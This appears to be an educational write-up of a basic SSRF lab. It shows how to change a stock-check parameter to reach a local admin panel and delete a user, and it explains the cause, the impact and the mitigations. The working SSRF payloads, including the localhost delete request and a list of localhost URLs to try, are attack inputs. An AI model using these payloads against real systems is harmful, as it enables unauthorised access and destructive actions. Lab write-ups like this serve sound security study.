# Lab 01: Basic SSRF Against the Local Server

## Lab Description

This lab contains a stock checking feature that retrieves stock information from an internal backend system.

The application is vulnerable to Server-Side Request Forgery (SSRF).

Your objective is to exploit this vulnerability to access the administrator interface running on the local server and delete the user **carlos**.

---

# Objective

- Access the internal admin panel.
- Delete the user `carlos`.
- Solve the lab.

---

# Vulnerability

The application accepts a user-controlled URL through the `stockApi` parameter.

Instead of validating the destination, the application directly sends an HTTP request to the supplied URL.

This allows an attacker to make the server communicate with unintended internal resources.

---

# Initial Request

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

---

# Exploitation Steps

## Step 1

Open any product.

---

## Step 2

Click **Check Stock**.

---

## Step 3

Intercept the request using Burp Suite.

Send it to **Repeater**.

---

## Step 4

Replace the `stockApi` value.

Original:

```text
http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

Replace with:

```text
http://localhost/admin
```

---

## Step 5

Send the request.

The application now returns the administrator interface.

---

## Step 6

Inspect the HTML response.

Locate the delete endpoint.

Example:

```text
http://localhost/admin/delete?username=carlos
```

---

## Step 7

Modify the request again.

```text
stockApi=http://localhost/admin/delete?username=carlos
```

---

## Step 8

Send the request.

The user **carlos** is deleted.

The lab is solved.

---

# Burp Workflow

```
Product

↓

Check Stock

↓

Intercept Request

↓

Send to Repeater

↓

Modify stockApi

↓

localhost/admin

↓

Admin Panel

↓

Delete Carlos
```

---

# Why the Attack Works

The administrator interface trusts requests coming from the local machine.

Since the vulnerable application itself makes the request, the access control is bypassed.

The request appears to originate from:

```
localhost
```

rather than the external attacker.

---

# Impact

An attacker can:

- Access hidden admin interfaces
- Bypass authentication
- Delete users
- Change configuration
- Read sensitive information

---

# Mitigation

- Validate user-supplied URLs.
- Restrict outbound requests.
- Never trust localhost requests alone.
- Require authentication for admin functionality.

---

# Bug Bounty Methodology

Whenever you discover SSRF:

Try:

```text
http://localhost/

http://127.0.0.1/

http://localhost/admin

http://127.0.0.1/admin
```

Look for:

- Admin panels
- Internal APIs
- Configuration endpoints
- Debug pages

---

# Key Learnings

- SSRF can target localhost.
- Local requests often bypass access controls.
- Always inspect responses for additional endpoints.
- SSRF against localhost is frequently high or critical severity.